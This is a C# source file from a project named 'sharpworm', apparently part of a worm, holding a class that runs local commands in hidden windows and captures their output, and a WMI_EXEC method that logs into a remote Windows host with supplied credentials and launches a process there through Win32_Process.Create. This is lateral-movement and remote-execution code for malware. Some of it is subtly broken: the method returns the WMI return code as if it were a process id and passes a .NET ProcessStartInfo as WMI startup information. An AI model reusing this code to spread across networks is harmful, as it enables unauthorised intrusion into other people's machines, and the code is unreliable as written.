using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace sharpworm
{
    class exec
    {
        Process processCmd;
        string outFile = String.Empty;
        

        public string exec1(string file, string args)
        {
            string stuffs = String.Empty;
            if (args.Contains(">"))
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.FileName = file;
                start.CreateNoWindow = true;
                start.UseShellExecute = false;
                string[] split = args.Split('>');
                start.Arguments = split[0];
                //outFile = split[1];
                //StreamWriter sW = new StreamWriter(outFile);
                start.RedirectStandardOutput = true;
                //start.RedirectStandardInput = true;
                //start.RedirectStandardError = true;
                using (Process process = Process.Start(start))
                {
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd();
                        //sW.Write(result);
                        stuffs = result;
                    }
                }
                //sW.Close();
            }
            else
            {
                processCmd = new Process();
                processCmd.StartInfo.FileName = file;
                processCmd.StartInfo.Arguments = args;
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new
DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            return stuffs;
        }

        private void CmdOutputDataHandler(object sendingProcess,
            DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                }
                catch (Exception err) { }
            }
        } 

        //WMI_EXEC

        public int WMI_EXEC(string remoteHostName, string userName, string password, string file, string dir, string args)
        {
            int pid = 0;
            ManagementScope ms = null;
            ConnectionOptions wmiServiceOptions = new ConnectionOptions();
            wmiServiceOptions.Impersonation = ImpersonationLevel.Delegate;
            wmiServiceOptions.Authentication = AuthenticationLevel.PacketPrivacy;

            string connectionString = string.Format("\\\\{0}\\root\\cimv2", remoteHostName);
            try
            {
                if (remoteHostName != "." && remoteHostName != "localhost" && userName != "$using current credentials")
                {

                    wmiServiceOptions.Username = userName;
                    wmiServiceOptions.Password = password;
                    ms = new ManagementScope(connectionString, wmiServiceOptions);
                }
                else
                {
                    ms = new ManagementScope(connectionString, wmiServiceOptions);
                }
                ManagementClass exec = new ManagementClass(ms, new ManagementPath("Win32_Process"), null);
                ManagementBaseObject inParams = exec.GetMethodParameters("Create");

                ProcessStartInfo p1 = new ProcessStartInfo();
                p1.Arguments=args;

                inParams["CommandLine"] = file;
                inParams["CurrentDirectory"]= dir;
                if (!(String.IsNullOrEmpty(args)))
                    inParams["ProcessStartupInformation"] = p1;

                ManagementBaseObject outparams = exec.InvokeMethod("Create", inParams, null);
                pid = System.Convert.ToInt32(outparams["returnValue"].ToString());
                //int error = (int)exec.InvokeMethod("Create", inParams, null).Properties["ProcessId"].Value;

                return pid;
            }
            catch
            {
                return 0;
            }

        }
    }
}
